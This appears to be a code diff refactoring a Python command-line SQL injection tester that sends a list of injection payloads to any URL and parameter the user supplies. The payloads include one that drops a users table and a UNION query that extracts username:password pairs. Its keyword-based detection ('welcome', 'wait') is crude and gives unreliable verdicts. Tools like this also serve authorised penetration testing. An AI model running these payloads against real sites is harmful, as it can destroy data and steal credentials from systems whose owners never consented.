@@ -1,21 +1,40 @@
 import argparse
 import requests
 
-def classify_response(response_text):
+def detect_vulnerabilities(response_text):
+    vulnerabilities = []
     if "error" in response_text.lower():
-        return "Error-based SQL Injection"
-    elif "welcome" in response_text.lower():
-        return "Boolean-based SQL Injection"
-    elif "wait" in response_text.lower():
-        return "Time-based Blind SQL Injection"
-    elif "union" in response_text.lower():
-        return "Union-based SQL Injection"
-    elif "nslookup" in response_text.lower():
-        return "Out-of-Band SQL Injection"
-    else:
-        return "Unknown"
+        vulnerabilities.append("Error-based SQL Injection")
+    if "welcome" in response_text.lower():
+        vulnerabilities.append("Boolean-based SQL Injection")
+    if "wait" in response_text.lower():
+        vulnerabilities.append("Time-based Blind SQL Injection")
+    if "union" in response_text.lower():
+        vulnerabilities.append("Union-based SQL Injection")
+    if "nslookup" in response_text.lower():
+        vulnerabilities.append("Out-of-Band SQL Injection")
+    return vulnerabilities
 
-def test_sqli_vulnerability(url, parameter):
+def test_sqli_vulnerability(url, parameter, payloads):
+    for payload, payload_name in payloads:
+        test_url = f"{url}?{parameter}={payload}"
+        response = requests.get(test_url)
+        detected_vulnerabilities = detect_vulnerabilities(response.text)
+        
+        print(f"Payload: {payload_name}")
+        if detected_vulnerabilities:
+            print(f"Detected Vulnerabilities: {', '.join(detected_vulnerabilities)}")
+        else:
+            print("No SQL Injection vulnerabilities detected.")
+        print("=" * 50)
+
+def main():
+    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Tester")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-p", "--parameter", required=True, help="Target parameter")
+
+    args = parser.parse_args()
+
     payloads = [
         ("'", "Single Quote Test"),
         ("'; DROP TABLE users; --", "SQL Injection with Malicious Query"),
@@ -31,25 +50,8 @@ def test_sqli_vulnerability(url, parameter):
         ("' OR IF(1=1, WAITFOR DELAY '0:0:5', 0)--", "Boolean-based Time Delay Test"),
         ("' UNION SELECT null, username + ':' + password FROM users--", "Error-based Concatenation Test"),
     ]
-    
-    for payload, payload_name in payloads:
-        test_url = f"{url}?{parameter}={payload}"
-        response = requests.get(test_url)
-        vulnerability_type = classify_response(response.text)
-        
-        print(f"Payload: {payload_name}")
-        print(f"Vulnerability Type: {vulnerability_type}")
-        print(f"Response content: {response.text}")
-        print("=" * 50)
 
-def main():
-    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Tester")
-    parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("-p", "--parameter", required=True, help="Target parameter")
-
-    args = parser.parse_args()
-    
-    test_sqli_vulnerability(args.url, args.parameter)
+    test_sqli_vulnerability(args.url, args.parameter, payloads)
 
 if __name__ == "__main__":
     main()
